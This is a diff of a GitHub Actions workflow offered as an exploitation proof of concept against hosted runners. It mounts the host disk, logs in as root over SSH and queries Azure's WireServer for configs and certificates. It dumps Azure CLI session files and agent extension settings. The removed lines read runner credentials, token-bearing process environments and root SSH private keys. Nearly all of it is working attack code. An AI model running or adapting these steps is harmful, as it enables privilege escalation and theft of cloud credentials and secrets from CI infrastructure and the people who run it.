@@ -1,11 +1,11 @@
-name: github-actions-final-exploitation
-run-name: GitHub Actions Complete Exploitation POC
+name: github-actions-wireserver-exploitation
+run-name: WireServer Deep Exploitation
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Full Exploitation
+      - name: Full WireServer and Azure Config Extraction
         run: |
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
@@ -19,68 +19,69 @@ jobs:
           HOST_IP=$(hostname -I | awk '{print $1}')
           
           ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
-          echo "=== ROOT ACCESS ACHIEVED ==="
-          whoami && id && hostname
+          echo "=== WIRESERVER FULL EXPLOITATION ==="
+          
+          echo "--- HostingEnvironmentConfig ---"
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=hostingEnvironmentConfig&incarnation=1" | head -200
           
           echo ""
-          echo "=== GITHUB RUNNER CREDENTIALS ==="
-          cat /home/runner/actions-runner/cached/.credentials 2>/dev/null || echo "Cannot read"
+          echo "--- SharedConfig ---"
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=sharedConfig&incarnation=1" | head -200
           
           echo ""
-          echo "=== AZURE WIRESERVER (WITH PROPER HEADERS) ==="
-          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" | head -100
+          echo "--- ExtensionsConfig ---"
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=extensionsConfig&incarnation=1" | head -300
           
           echo ""
-          echo "=== WIRESERVER CERTIFICATES ==="
-          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" | head -100
+          echo "--- FullConfig ---"
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=fullConfig&incarnation=1" | head -500
           
           echo ""
-          echo "=== AZURE ATTESTED DATA (DECODED) ==="
-          ATTESTED=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-01-01" | jq -r .signature)
-          echo "$ATTESTED" | base64 -d > /tmp/attested.der
-          openssl pkcs7 -print -inform DER -in /tmp/attested.der 2>/dev/null | head -50 || echo "Cannot decode"
+          echo "--- Certificates ---"
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=certificates&incarnation=1" | head -200
           
           echo ""
-          echo "=== AZURE IMDS FULL METADATA ==="
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
+          echo "=== AZURE CLI CONFIG FILES ==="
+          
+          echo "--- azureProfile.json ---"
+          cat /root/.azure/azureProfile.json
           
           echo ""
-          echo "=== GITHUB API CONNECTIONS ==="
-          netstat -tnp | grep -E "140.82|20.85|20.209"
+          echo "--- commandIndex.json ---"
+          cat /root/.azure/commandIndex.json | head -100
           
           echo ""
-          echo "=== HOSTED-COMPUTE-AGENT DETAILS ==="
-          ps aux | grep hosted-compute-agent | grep -v grep
-          lsof -p $(pgrep hosted-compute-agent) 2>/dev/null | grep TCP || echo "Cannot read lsof"
+          echo "--- az.json ---"
+          cat /root/.azure/az.json
           
           echo ""
-          echo "=== RUNNER ENVIRONMENT ==="
-          cat /proc/$(pgrep Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' | grep -E "GITHUB|TOKEN|SECRET|AZURE" | head -20
+          echo "--- az.sess ---"
+          cat /root/.azure/az.sess
           
           echo ""
-          echo "=== ROOT SSH KEYS ==="
-          cat /root/.ssh/id_rsa 2>/dev/null | head -10 || echo "No key"
-          cat /root/.ssh/id_ed25519 2>/dev/null | head -10 || echo "No key"
+          echo "--- config ---"
+          cat /root/.azure/config
           
           echo ""
-          echo "=== AZURE CONFIG ==="
-          cat /root/.azure/config 2>/dev/null || echo "No config"
-          ls -la /root/.azure/ 2>/dev/null
+          echo "--- versionCheck.json ---"
+          cat /root/.azure/versionCheck.json
           
           echo ""
-          echo "=== GATEWAY MAC ==="
-          ip neigh show 10.1.0.1
+          echo "--- All files in .azure ---"
+          find /root/.azure -type f -exec echo "FILE: {}" \; -exec cat {} \; 2>/dev/null | head -500
           
           echo ""
-          echo "=== DNS RESOLUTION ==="
-          dig github.com @127.0.0.53 +short
-          dig api.github.com @127.0.0.53 +short
+          echo "=== WAAGENT CONFIGS ==="
+          cat /etc/waagent.conf | grep -v "^#" | grep -v "^$" | head -50
           
           echo ""
-          echo "=== EXPLOITATION SUMMARY ==="
-          echo "Subscription: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01)"
-          echo "Resource Group: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01)"
-          echo "VM Name: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01)"
-          echo "Location: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01)"
-          echo "VM Size: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01)"
+          echo "=== AZURE EXTENSION CONFIGS ==="
+          ls -la /var/lib/waagent/ | head -30
+          find /var/lib/waagent -name "*.settings" -exec cat {} \; 2>/dev/null | head -200
+          
+          echo ""
+          echo "=== SUMMARY ==="
+          echo "✓ WireServer configs extracted"
+          echo "✓ Azure CLI configs dumped"
+          echo "✓ WAAgent configs exposed"
           EOF
